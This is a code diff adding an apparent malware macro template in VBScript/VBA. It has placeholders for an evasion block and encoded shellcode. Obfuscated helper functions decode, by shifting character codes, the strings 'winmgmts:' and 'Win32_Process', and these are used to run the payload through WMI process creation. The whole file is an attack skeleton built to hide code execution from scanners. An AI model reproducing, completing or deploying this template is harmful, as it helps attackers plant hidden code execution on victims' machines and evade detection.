@@ -1,0 +1,60 @@
+//####DEFINE####
+
+//####CODE####
+
+MyRun
+
+
+Function Grass(Goats)
+    Grass = Chr(Goats - 17)
+End Function
+
+Function RecMaster(Grapes)
+    RecMaster = Left(Grapes, 3)
+End Function
+
+Function SlaveCon(Topside)
+    SlaveCon = Right(Topside, Len(Topside) - 3)
+End Function
+
+Function ThinyColor(Troop)
+    Do
+        Shazam = Shazam & Grass(RecMaster(Troop))
+        Troop = SlaveCon(Troop)
+    Loop While Len(Troop) > 0
+    ThinyColor = Shazam
+End Function
+
+Sub MyRun()
+
+    //####EVASION####
+
+    Dim Leap
+    Dim buf
+
+
+    ' Our encoded shellcode
+    buf = ####SHELLCODE####
+
+    //####CALL####
+
+    ' Check if input is already a string
+    If VarType(buf) = vbString Then
+        Leap = buf
+    Else
+        Leap = ArrayToString(buf)
+    End If
+
+    ' WMI process execution
+    GetObject(ThinyColor("136122127126120126133132075")).Get(ThinyColor("104122127068067112097131128116118132132")).Create Leap, Tea, Coffee, Napkin
+End Sub
+
+Function ArrayToString(arr)
+    On Error Resume Next
+    Dim result, i
+    result = ""
+    For i = LBound(arr) To UBound(arr)
+        result = result & Chr(arr(i))
+    Next
+    ArrayToString = result
+End Function
